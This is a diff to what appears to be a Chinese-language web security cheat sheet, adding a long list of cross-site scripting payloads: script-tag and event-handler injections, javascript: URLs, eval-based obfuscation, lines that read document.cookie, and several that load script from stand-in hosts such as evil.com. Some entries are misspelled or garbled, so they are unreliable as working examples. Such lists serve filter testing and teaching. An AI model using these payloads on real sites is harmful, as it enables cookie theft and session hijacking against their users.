@@ -23,6 +23,35 @@ SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获
 <script>alert(1);</script>
 <img src=0 onerror=alert(1)>
 "><script src=http://www.xxx.com/1.js></script>"
+"></iframe><script>alert(123)></script>
+<body onLoad="while(true) alert("XSS"),">
+"></tile><script>alert(1111)</script>
+</textarea>'"><script>alert(document.cookie)</script>
+'""><script language="JavaScript"> alert("X \nS \nS"),</script>
+</script></script><<<<script><>>>><<<script>alert(123)</script>
+<html><noalert><noscript>(123)</noscript><script>(123)</script>
+<INPUTTYPE="IMAGE"SRC="javasctipt:alert("XSS");">
+'></select><script>alert(123)</script>
+'>'><script src='http://www.evil.com/XSS.js'></script>
+}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+<SCRIPT>document.write("XSS");</SCRIPT>
+a="get";b="URL";c="javascript:";d="alert("XSS");";eval(a+b+c+d);
+='><script>alert("XSS")</script>
+<sctipt+src=">"+src="http://www.evil.com/XSS.js?68,69"></script>
+<body backgroud=jabascript:'"><script>alert(navigator.userAgent)</sctipt>></body>
+">XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/X
+Data:text/html;charset=utf-7;base64.Ij481.3RpdGod[jxzY3JpcHQ+YWxlcnQoMIMzNy
+"<marquee><img src=k.png onerror=alert(/XSS/)/>
+"<marquee><img src=k onerror=alert(/XSS/)>
+'"><marquee><img src=k.png onerror=alert(/XSS/.source)/>
+</div><script>alert(123)</script>
+"><iframe src="javascript:alert(document.cookie)'><iframe>
+<div style="backgroud:url("javascript:alert(I)')">
+<img src="java\nascript:alert(\"XSS\")">
+>"><img src="javascript:alert("XSS")">
+"style="background:url(javascript:alert(/XSS/))"
+>"><script>alert(/XSS/)</script>
+"></title><script>alert(I)</script>
 ```
 反射XSS:欺骗用户点击，可能会被浏览器过滤
 
